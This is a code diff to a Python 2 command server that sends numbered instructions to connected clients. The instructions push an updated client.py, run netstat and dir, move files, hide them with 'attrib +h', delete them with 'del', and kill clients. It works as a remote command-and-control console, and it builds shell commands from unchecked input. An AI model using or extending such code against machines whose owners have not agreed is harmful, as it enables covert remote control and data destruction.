@@ -89,11 +89,11 @@ def handle_request(data, open_client_sockets=[], current_socket=None):
                     if soc.getsockname()[0] == d.clientReq.clientStart.ip and soc.getsockname()[1] \
                             not in [d.clientReq.clientStart.port, PORT]:
                         pass
-                        # print "goodbye ", soc.getsockname()
-                        # d1 = data_pb2.TData()
-                        # d1.serverReq.id = random.randint(1, MAX_RANDOM)
-                        # d1.serverReq.killYourself.status = 0
-                        # send_data_to_all(d1.SerializeToString(), None, [soc], [soc])
+                        print "goodbye ", soc.getsockname()
+                        d1 = data_pb2.TData()
+                        d1.serverReq.id = random.randint(1, MAX_RANDOM)
+                        d1.serverReq.killYourself.status = 0
+                        send_data_to_all(d1.SerializeToString(), None, [soc], [soc])
         if d.WhichOneof("Msg") == 'clientRsp':
             print "status:", d.clientRsp.status
             if d.clientRsp.WhichOneof("Type") == 'cmdCommandResult':
@@ -125,15 +125,30 @@ def send_open_socket(open_client_sockets, wlist):
 
 def send_message(msg, open_client_sockets=None, wlist=None):
     if msg.startswith('1'):
+        print "update version"
         send_updates_file('client.py', open_client_sockets, wlist)
     elif msg.startswith('2'):
+        print "netstat"
         send_command("netstat -a -n -o", open_client_sockets, wlist)
     elif msg.startswith('3'):
+        print "ls -- error"
         send_command("ls -l", open_client_sockets, wlist)
     elif msg.startswith('4'):
+        print "open new socket"
         send_open_socket(open_client_sockets, wlist)
     elif msg.startswith('5'):
+        print "dir"
         send_command("cd " + raw_input("enter directory: ") + " & dir", open_client_sockets, wlist)
+    elif msg.startswith('6'):
+        print "move"
+        send_command("move " + raw_input("enter src_file: ") + raw_input("enter dst_file: "), open_client_sockets,
+                     wlist)
+    elif msg.startswith('7'):
+        print "hidden"
+        send_command("attrib +h " + raw_input("enter file path & name: "), open_client_sockets, wlist)
+    elif msg.startswith('8'):
+        print "remove"
+        send_command("del " + raw_input("enter file path & name: ") + " & dir", open_client_sockets, wlist)
 
 
 def main():
@@ -158,6 +173,7 @@ def main():
                 if current_socket is server_socket:
                     (new_socket, address) = server_socket.accept()
                     open_client_sockets.append(new_socket)
+                    print new_socket.getsockname()
                 else:
                     print 'New data from client!'
                     try:
